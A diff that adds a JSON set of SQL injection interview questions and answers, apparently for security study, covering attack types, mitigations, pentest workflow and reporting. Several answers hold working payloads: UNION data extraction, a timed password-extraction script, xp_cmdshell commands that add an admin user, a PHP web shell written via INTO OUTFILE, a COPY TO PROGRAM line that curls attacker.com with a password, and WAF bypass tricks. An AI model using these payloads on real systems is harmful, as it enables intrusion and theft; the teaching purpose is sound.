@@ -1,0 +1,133 @@
+{
+  "topicId": "sql-injection",
+  "name": "SQL Injection",
+  "source": "SQL Injection/SQL Injection - Interview Questions & Answers.md",
+  "prompts": [
+    {
+      "id": "pee123a72b7c748",
+      "cluster": "Fundamental Questions",
+      "title": "What is SQL Injection and how does it work?",
+      "seconds": 120,
+      "answerMarkdown": "SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user-supplied input is not properly validated, sanitized, or parameterized before being used in SQL queries.\n\n**How it works:**\n\n1. **Vulnerable Code:**\n\n```python\nusername = request.form['username']\nquery = f\"SELECT * FROM users WHERE username = '{username}'\"\n\n```\n\n1. **Attack Input:**\n\n```\nUsername: admin'--\n\n```\n\n1. **Resulting Query:**\n\n```sql\nSELECT * FROM users WHERE username = 'admin'--'\n\n```\n\n1. **Impact:**\n- The\u00a0`-`\u00a0comments out the rest of the query\n- Bypasses authentication\n- Allows unauthorized access\n\n**Key Point:**\u00a0SQL injection works because the application treats user input as SQL code rather than data.\n\n---"
+    },
+    {
+      "id": "p1b11d362ec59ca",
+      "cluster": "Fundamental Questions",
+      "title": "What are the main types of SQL Injection?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Classic/In-Band SQL Injection:**\n\n- Attacker receives results directly in application response\n- **Subtypes:**\n    - **Error-Based**: Exploits database error messages\n    - **Union-Based**: Uses UNION to combine queries\n\n**2. Blind SQL Injection:**\n\n- Attacker doesn't see direct results\n- Infers information from application behavior\n- **Subtypes:**\n    - **Boolean-Based**: Uses true/false conditions\n    - **Time-Based**: Uses time delays\n\n**3. Second-Order SQL Injection:**\n\n- Malicious input stored and executed later\n- Example: Stored username exploited during login\n\n**4. Out-of-Band SQL Injection:**\n\n- Uses alternative channels (DNS, HTTP) to extract data\n- Less common but still dangerous\n\n---"
+    },
+    {
+      "id": "p78e9acc6a20b72",
+      "cluster": "Fundamental Questions",
+      "title": "What is the difference between error-based and blind SQL injection?",
+      "seconds": 120,
+      "answerMarkdown": "**Error-Based SQL Injection:**\n\n- Database errors are visible to attacker\n- Errors reveal database structure\n- Easier to exploit\n- Example:\u00a0`' OR 1=1--`\u00a0shows SQL error\n\n**Blind SQL Injection:**\n\n- No direct error messages\n- Attacker infers information from behavior\n- Harder to exploit but still dangerous\n- **Boolean-Based**: Different responses for true/false\n- **Time-Based**: Delayed responses indicate success\n\n**Example - Boolean-Based:**\n\n```sql\n-- True condition\n' AND 1=1--  \u2192 Returns data\n\n-- False condition\n' AND 1=2--  \u2192 No data returned\n\n```\n\n**Example - Time-Based:**\n\n```sql\n-- If condition is true, delay 5 seconds\n'; IF(1=1, WAITFOR DELAY '00:00:05', 0)--\n\n```\n\n---"
+    },
+    {
+      "id": "p7179847634ca37",
+      "cluster": "Types and Techniques",
+      "title": "How would you exploit a UNION-based SQL injection?",
+      "seconds": 120,
+      "answerMarkdown": "**Step 1: Determine Column Count**\n\n```sql\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n-- Continue until error\n\n```\n\n**Step 2: Find Compatible Columns**\n\n```sql\n' UNION SELECT NULL--\n' UNION SELECT NULL, NULL--\n' UNION SELECT NULL, NULL, NULL--\n\n```\n\n**Step 3: Extract Data**\n\n```sql\n-- Extract database version\n' UNION SELECT NULL, @@version, NULL--\n\n-- Extract table names\n' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--\n\n-- Extract column names\n' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--\n\n-- Extract user data\n' UNION SELECT NULL, username, password FROM users--\n\n```\n\n**Key Points:**\n\n- Number of columns must match\n- Data types must be compatible\n- Use NULL for incompatible columns\n\n---"
+    },
+    {
+      "id": "p48c87b349613ad",
+      "cluster": "Types and Techniques",
+      "title": "Explain time-based blind SQL injection with an example.",
+      "seconds": 120,
+      "answerMarkdown": "Time-based blind SQL injection uses time delays to infer information when no direct output is available.\n\n**Technique:**\n\n```sql\n-- Test if condition is true (delays if true)\n'; IF(condition, WAITFOR DELAY '00:00:05', 0)--\n\n```\n\n**Example - Extract Password Character:**\n\n```sql\n-- Test if first character is 'a' (ASCII 97)\n'; IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, WAITFOR DELAY '00:00:05', 0)--\n\n-- If response is delayed, first character is 'a'\n-- Repeat for each character position\n\n```\n\n**Automated Extraction:**\n\n```python\nimport requests\nimport time\n\ndef extract_char(position):\n    for char_code in range(32, 127):\n        payload = f\"'; IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),{position},1))={char_code}, WAITFOR DELAY '00:00:05', 0)--\"\n        start = time.time()\n        requests.get(f\"http://target.com/page?id={payload}\")\n        elapsed = time.time() - start\n        if elapsed > 4:\n            return chr(char_code)\n    return None\n\n```\n\n**Key Points:**\n\n- Slower than other methods\n- Requires patience\n- Can extract complete databases\n- Harder to detect\n\n---"
+    },
+    {
+      "id": "pfed30a1e980269",
+      "cluster": "Types and Techniques",
+      "title": "What is second-order SQL injection?",
+      "seconds": 120,
+      "answerMarkdown": "Second-order SQL injection occurs when malicious input is stored in the database and later used in a SQL query without proper sanitization.\n\n**Attack Scenario:**\n\n**Step 1: Registration (Stored)**\n\n```python\n\n# Attacker registers with malicious username\n\nusername = \"admin'--\"\ndb.execute(f\"INSERT INTO users (username, password) VALUES ('{username}', 'password')\")\n\n# Stored as: admin'--\n\n```\n\n**Step 2: Login (Exploited)**\n\n```python\n\n# Later, during login\n\nusername = get_username_from_db()  # Returns: admin'--\nquery = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n\n# Executes: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'\n\n# Bypasses password check\n\n```\n\n**Why it's dangerous:**\n\n- Input may pass initial validation\n- Stored data is trusted\n- Exploited in different context\n- Harder to detect\n\n**Mitigation:**\n\n- Always use parameterized queries\n- Validate input at all stages\n- Don't trust stored data\n\n---"
+    },
+    {
+      "id": "pff5a0d3e671c32",
+      "cluster": "Security Questions",
+      "title": "What is the impact of SQL injection?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Authentication Bypass:**\n\n- Login without credentials\n- Access any user account\n- Escalate privileges\n\n**2. Data Breach:**\n\n- Extract all user data\n- Access sensitive information\n- Read configuration files\n\n**3. Data Manipulation:**\n\n- Modify user data\n- Change prices/values\n- Alter records\n\n**4. Data Deletion:**\n\n- Delete entire tables\n- Drop databases\n- Truncate data\n\n**5. Remote Code Execution:**\n\n- Execute OS commands\n- Access file system\n- Install backdoors\n\n**6. Server Compromise:**\n\n- Complete system control\n- Access internal network\n- Use as attack platform\n\n**Business Impact:**\n\n- Financial losses\n- Reputation damage\n- Legal/regulatory violations\n- Customer trust loss\n\n---"
+    },
+    {
+      "id": "p0a04b04f71fc08",
+      "cluster": "Security Questions",
+      "title": "How can SQL injection lead to remote code execution?",
+      "seconds": 120,
+      "answerMarkdown": "**MSSQL Example:**\n\n```sql\n-- Enable xp_cmdshell\n'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--\n\n-- Execute commands\n'; EXEC xp_cmdshell 'whoami'--\n'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'--\n'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--\n\n```\n\n**MySQL Example:**\n\n```sql\n-- Write to file\n' UNION SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/shell.php'--\n\n```\n\n**PostgreSQL Example:**\n\n```sql\n-- Execute commands\n'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('whoami');--\n\n```\n\n**Prerequisites:**\n\n- Database user with high privileges\n- Certain database features enabled\n- File system access\n\n**Mitigation:**\n\n- Use least privilege\n- Disable dangerous functions\n- Network segmentation\n\n---"
+    },
+    {
+      "id": "p9438fc675d75ce",
+      "cluster": "Mitigation Questions",
+      "title": "How do you prevent SQL injection?",
+      "seconds": 120,
+      "answerMarkdown": "**Primary Defense: Parameterized Queries (Prepared Statements)**\n\n```python\n\n# \u2705 CORRECT\n\nquery = \"SELECT * FROM users WHERE username = ? AND password = ?\"\ncursor.execute(query, (username, password))\n\n```\n\n**Why it works:**\n\n- Separates SQL code from data\n- Database treats input as data, not code\n- Prevents injection regardless of input\n\n**Additional Defenses:**\n\n**1. Input Validation:**\n\n```python\nimport re\n\ndef validate_username(username):\n    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):\n        raise ValueError(\"Invalid username\")\n    return username\n\n```\n\n**2. Least Privilege:**\n\n```sql\n-- Database user with minimal privileges\nCREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';\nGRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';\n-- No DROP, ALTER, or EXECUTE privileges\n\n```\n\n**3. Error Handling:**\n\n```python\ntry:\n    cursor.execute(query, params)\nexcept DatabaseError as e:\n    logger.error(f\"Database error: {str(e)}\")\n\n# Don't expose error details\n\n    raise ApplicationError(\"An error occurred\")\n\n```\n\n**4. WAF (Secondary Defense):**\n\n- Deploy WAF as additional layer\n- Not a substitute for secure coding\n\n---"
+    },
+    {
+      "id": "pada873e3a682ff",
+      "cluster": "Mitigation Questions",
+      "title": "What is the difference between parameterized queries and input sanitization?",
+      "seconds": 120,
+      "answerMarkdown": "**Parameterized Queries (Prepared Statements):**\n\n- **Primary defense**\u00a0against SQL injection\n- Separates SQL code from data\n- Database treats input as data, not code\n- **Always effective**\u00a0when used correctly\n\n```python\n\n# \u2705 CORRECT\n\nquery = \"SELECT * FROM users WHERE username = ?\"\ncursor.execute(query, (username,))\n\n```\n\n**Input Sanitization:**\n\n- **Secondary defense**\u00a0(not sufficient alone)\n- Attempts to remove/escape dangerous characters\n- Can be bypassed with encoding/obfuscation\n- **Not reliable**\u00a0as primary defense\n\n```python\n\n# \u26a0\ufe0f NOT SUFFICIENT ALONE\n\ndef sanitize(input_value):\n    return input_value.replace(\"'\", \"''\")  # Can be bypassed!\n\n```\n\n**Why Sanitization Fails:**\n\n```python\n\n# Attacker can use encoding\n\nusername = \"admin'--\"  # Blocked\nusername = \"admin%27--\"  # URL encoded, might bypass\nusername = \"admin\\u0027--\"  # Unicode, might bypass\n\n```\n\n**Key Point:**\u00a0Always use parameterized queries as primary defense. Sanitization is additional layer only.\n\n---"
+    },
+    {
+      "id": "pb2d589c8080d11",
+      "cluster": "Mitigation Questions",
+      "title": "Can input validation alone prevent SQL injection?",
+      "seconds": 120,
+      "answerMarkdown": "**No, input validation alone cannot prevent SQL injection.**\n\n**Why Input Validation is Not Enough:**\n\n**1. Bypass Techniques:**\n\n```python\n\n# Validation: Only alphanumeric\n\nusername = \"admin123\"  # Passes validation\n\n# But what if query is\n\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\n# user_id = \"1 OR 1=1\"  # No quotes needed\n\n```\n\n**2. Encoding/Obfuscation:**\n\n```python\n\n# Validation blocks: admin'--\n\n# But attacker uses\n\nusername = \"admin%27--\"  # URL encoded\nusername = \"admin\\u0027--\"  # Unicode\nusername = \"admin\" + chr(39) + \"--\"  # Character code\n\n```\n\n**3. Context Matters:**\n\n```python\n\n# Validation allows: admin123\n\n# But in different context\n\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\n# user_id = \"1 UNION SELECT * FROM users--\"\n\n# No quotes, validation passes\n\n```\n\n**Correct Approach:**\n\n- \u2705\u00a0**Primary**: Parameterized queries\n- \u2705\u00a0**Secondary**: Input validation\n- \u2705\u00a0**Tertiary**: WAF, error handling\n\n**Key Point:**\u00a0Input validation helps but parameterized queries are the only reliable defense.\n\n---"
+    },
+    {
+      "id": "p603fc5a880ccc2",
+      "cluster": "Scenario-Based Questions",
+      "title": "You discover SQL injection in a login form. How would you exploit it?",
+      "seconds": 120,
+      "answerMarkdown": "**Step 1: Identify Vulnerability**\n\n```python\n\n# Vulnerable code\n\nusername = request.form['username']\npassword = request.form['password']\nquery = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n\n```\n\n**Step 2: Test Basic Injection**\n\n```\nUsername: admin'--\nPassword: (anything)\n\n```\n\n**Step 3: Resulting Query**\n\n```sql\nSELECT * FROM users WHERE username = 'admin'--' AND password = ''\n-- Password check is commented out!\n\n```\n\n**Step 4: Alternative Payloads**\n\n```\nUsername: ' OR '1'='1\nUsername: ' OR '1'='1'--\nUsername: admin' OR '1'='1'--\nUsername: ' UNION SELECT * FROM users--\n\n```\n\n**Step 5: Extract Data (if UNION works)**\n\n```\nUsername: ' UNION SELECT username, password FROM users--\n\n```\n\n**Impact:**\n\n- Bypass authentication\n- Access any account\n- Extract credentials\n- Escalate privileges\n\n---"
+    },
+    {
+      "id": "p0f0092b11c35c3",
+      "cluster": "Scenario-Based Questions",
+      "title": "How would you test for blind SQL injection?",
+      "seconds": 120,
+      "answerMarkdown": "**Boolean-Based Testing:**\n\n**Step 1: Identify Different Behaviors**\n\n```sql\n-- True condition\n' AND 1=1--  \u2192 Returns data/normal response\n\n-- False condition\n' AND 1=2--  \u2192 No data/error response\n\n```\n\n**Step 2: Extract Information Character by Character**\n\n```sql\n-- Test if first character of password is 'a'\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--\n\n-- If true, get normal response\n-- If false, get different response\n\n```\n\n**Time-Based Testing:**\n\n**Step 1: Confirm Vulnerability**\n\n```sql\n-- MySQL\n' AND SLEEP(5)--\n\n-- MSSQL\n'; WAITFOR DELAY '00:00:05'--\n\n-- PostgreSQL\n'; SELECT pg_sleep(5)--\n\n```\n\n**Step 2: Extract Data**\n\n```sql\n-- Extract character by character\n' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, SLEEP(5), 0)--\n\n-- If delayed, character is 'a' (ASCII 97)\n\n```\n\n**Automation:**\n\n- Use SQLMap for automated extraction\n- Script custom extraction tools\n- Monitor response times\n\n---"
+    },
+    {
+      "id": "pd5eddcdd2d534b",
+      "cluster": "Advanced Questions",
+      "title": "How would you bypass WAF (Web Application Firewall) for SQL injection?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Encoding/Obfuscation:**\n\n```sql\n-- Original: ' OR '1'='1\n-- URL encoded: %27%20OR%20%271%27%3D%271\n-- Unicode: \\u0027 OR \\u00271\\u0027=\\u00271\n-- Hex: 0x27 OR 0x2731=0x2731\n\n```\n\n**2. Alternative Keywords:**\n\n```sql\n-- Instead of: UNION SELECT\n-- Use: UNION/**/SELECT\n-- Use: UNI/**/ON SEL/**/ECT\n-- Use: /*comment*/UNION/*comment*/SELECT\n\n```\n\n**3. Case Variation:**\n\n```sql\n-- Instead of: SELECT\n-- Use: SeLeCt\n-- Use: sElEcT\n\n```\n\n**4. Function Alternatives:**\n\n```sql\n-- Instead of: OR 1=1\n-- Use: OR 1=1-0\n-- Use: OR '1'='1'\n-- Use: OR CHAR(49)=CHAR(49)\n\n```\n\n**5. Time-Based (Harder to Detect):**\n\n```sql\n-- Instead of: UNION SELECT\n-- Use: '; WAITFOR DELAY '00:00:05'--\n\n```\n\n**6. Comments:**\n\n```sql\n-- Use comments to break up keywords\n'/**/OR/**/1=1--\n'/*comment*/OR/*comment*/1=1--\n\n```\n\n**Key Point:**\u00a0WAF bypass is possible, which is why parameterized queries are essential.\n\n---"
+    },
+    {
+      "id": "p5f1861feb8931e",
+      "cluster": "Advanced Questions",
+      "title": "Explain how SQL injection can be used for SSRF (Server-Side Request Forgery).",
+      "seconds": 120,
+      "answerMarkdown": "**Scenario:**\u00a0SQL injection in database that supports making HTTP requests.\n\n**MSSQL Example:**\n\n```sql\n-- Enable advanced options\n'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--\n\n-- Enable OLE Automation\n'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;--\n\n-- Make HTTP request\n'; DECLARE @h INT; EXEC sp_OACreate 'MSXML2.XMLHTTP', @h OUT; EXEC sp_OAMethod @h, 'open', NULL, 'GET', 'http://internal-server:8080/admin', false; EXEC sp_OAMethod @h, 'send';--\n\n```\n\n**PostgreSQL Example:**\n\n```sql\n-- Using COPY command\n'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=' || (SELECT password FROM users WHERE id=1);--\n\n```\n\n**Impact:**\n\n- Access internal services\n- Bypass network restrictions\n- Extract data via out-of-band channels\n- Port scanning internal network\n\n**Mitigation:**\n\n- Use least privilege\n- Disable dangerous functions\n- Network segmentation\n- Parameterized queries\n\n---"
+    },
+    {
+      "id": "pabb50b87fbb91e",
+      "cluster": "Penetration Testing Questions",
+      "title": "How would you test for SQL injection during a penetration test?",
+      "seconds": 120,
+      "answerMarkdown": "**1. Reconnaissance:**\n\n- Identify all input points\n- URL parameters\n- POST data\n- HTTP headers\n- Cookies\n\n**2. Basic Testing:**\n\n```sql\n-- Test for errors\n'\n\"\n`\n\n-- Test basic injection\n' OR '1'='1\n' OR '1'='1'--\n' OR 1=1--\n\n```\n\n**3. Database Fingerprinting:**\n\n```sql\n-- MySQL\n' AND @@version LIKE 'MySQL%'--\n\n-- MSSQL\n' AND @@version LIKE 'Microsoft%'--\n\n-- PostgreSQL\n' AND version() LIKE 'PostgreSQL%'--\n\n```\n\n**4. Schema Enumeration:**\n\n```sql\n-- List tables\n' UNION SELECT table_name FROM information_schema.tables--\n\n-- List columns\n' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--\n\n```\n\n**5. Data Extraction:**\n\n```sql\n-- Extract data\n' UNION SELECT username, password FROM users--\n\n```\n\n**6. Tools:**\n\n- SQLMap for automated testing\n- Burp Suite for manual testing\n- Custom scripts for specific cases\n\n**7. Blind Testing:**\n\n- Boolean-based: Different responses\n- Time-based: Delayed responses\n\n---"
+    },
+    {
+      "id": "p09e9b836f2ab7c",
+      "cluster": "Penetration Testing Questions",
+      "title": "What tools would you use for SQL injection testing?",
+      "seconds": 120,
+      "answerMarkdown": "**1. SQLMap:**\n\n```bash\n\n# Basic scan\n\nsqlmap -u \"http://target.com/page?id=1\" --dbs\n\n# Extract data\n\nsqlmap -u \"http://target.com/page?id=1\" -D database -T users --dump\n\n# Advanced options\n\nsqlmap -u \"http://target.com/page?id=1\" --level=5 --risk=3 --tamper=space2comment\n\n```\n\n**2. Burp Suite:**\n\n- SQL injection scanner\n- Manual testing\n- Intruder for fuzzing\n- Repeater for payload testing\n\n**3. OWASP ZAP:**\n\n- Automated scanning\n- Manual testing\n- Fuzzing capabilities\n\n**4. Custom Scripts:**\n\n```python\nimport requests\n\npayloads = [\n    \"' OR '1'='1\",\n    \"' OR '1'='1'--\",\n    \"' UNION SELECT NULL--\",\n    \"'; WAITFOR DELAY '00:00:05'--\"\n]\n\nfor payload in payloads:\n    response = requests.get(f\"http://target.com/search?q={payload}\")\n    if \"error\" in response.text.lower() or response.elapsed.total_seconds() > 4:\n        print(f\"Potential SQLi: {payload}\")\n\n```\n\n**5. NoSQLMap:**\n\n- For NoSQL injection testing\n\n---"
+    },
+    {
+      "id": "p154111237fa66d",
+      "cluster": "Penetration Testing Questions",
+      "title": "How would you report a SQL injection vulnerability?",
+      "seconds": 120,
+      "answerMarkdown": "**Report Structure:**\n\n**1. Executive Summary:**\n\n- Vulnerability type\n- Severity (Critical/High/Medium/Low)\n- Affected component\n- Business impact\n\n**2. Technical Details:**\n\n- Vulnerable endpoint\n- Vulnerable code snippet\n- Attack vector\n- Proof of concept\n\n**3. Impact Assessment:**\n\n- Confidentiality impact\n- Integrity impact\n- Availability impact\n- Business impact\n\n**4. Steps to Reproduce:**\n\n```\n1. Navigate to http://target.com/login\n2. Enter username: admin'--\n3. Enter password: (anything)\n4. Click login\n5. Successfully logged in as admin\n\n```\n\n**5. Remediation:**\n\n- Use parameterized queries\n- Input validation\n- Least privilege\n- Error handling\n\n**6. Evidence:**\n\n- Screenshots\n- Request/response logs\n- Video demonstration\n\n**7. Risk Rating:**\n\n- CVSS score\n- Likelihood\n- Impact\n- Business risk\n\n---"
+    }
+  ]
+}
